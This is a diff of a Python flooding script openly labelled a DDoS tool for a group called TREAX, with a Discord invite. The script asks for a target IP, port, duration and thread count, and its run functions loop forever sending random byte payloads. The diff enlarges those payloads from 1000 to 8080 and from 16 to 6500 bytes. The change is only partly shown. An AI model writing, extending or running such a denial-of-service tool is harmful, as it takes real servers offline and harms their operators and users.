@@ -15,15 +15,15 @@ print('''\033[94
 ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[94''')
 print(" DDoS Tools For My Squad : TREAX ") 
 print(" Join to my squad discord link ")
-print(" TREAX SQUAD :
+print(" TREAX SQUAD : https://discord.gg/ScPy4SMc ") 
     
-ip = str(input("  IP Target :"))
-port = int(input(" PORT Target :"))
-choice = str(input(" Are You Seriously? (y/n) :"))
-times = int(input(" Times :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[94  IP Target :\033[94"))
+port = int(input("\033[94 PORT Target :\033[94"))
+choice = str(input("\033[94 Are You Seriously? (y/n) :\033[94"))
+times = int(input("\033[94 Times :\033[94"))
+threads = int(input("\033[94 Threads :\033[94"))
 def run():
-	data = random._urandom(1000)
+	data = random._urandom(8080)
 	i = random.choice(("[+]","[-]","[=]"))
 	while True:
 		try:
@@ -36,7 +36,7 @@ def run():
 			print("[-] Server Has Been Maintenance")
 
 def run2():
-	data = random._urandom(16)
+	data = random._urandom(6500)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
